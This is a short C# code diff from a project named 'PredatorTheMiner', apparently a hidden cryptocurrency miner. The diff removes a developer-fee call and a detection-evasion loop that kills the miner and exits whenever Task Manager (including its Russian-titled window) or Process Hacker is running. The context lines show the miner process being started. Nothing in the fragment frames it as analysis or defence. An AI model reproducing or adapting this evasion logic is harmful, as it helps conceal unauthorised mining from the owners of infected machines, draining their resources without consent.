@@ -75,22 +75,7 @@ namespace PredatorTheMiner
 
 					process.Start();
 				}
-				
-				Helper.AuthorFee();
 
-				while (true)
-				{
-					if ((Process.GetProcessesByName("taskmgr").Length > 0 ||
-						Process.GetProcessesByName("Taskmgr").Length > 0 ||
-						Process.GetProcessesByName("ProcessHacker").Length > 0) || Environment.HasShutdownStarted ||
-						FindWindow("", "Task Manager") != IntPtr.Zero || 
-						FindWindow("", "Диспетчер задач") != IntPtr.Zero)
-					{
-						process.Kill();
-						Environment.Exit(0);
-					}
-					Thread.Sleep(10);
-				}
 			}
 			catch { }
 		}
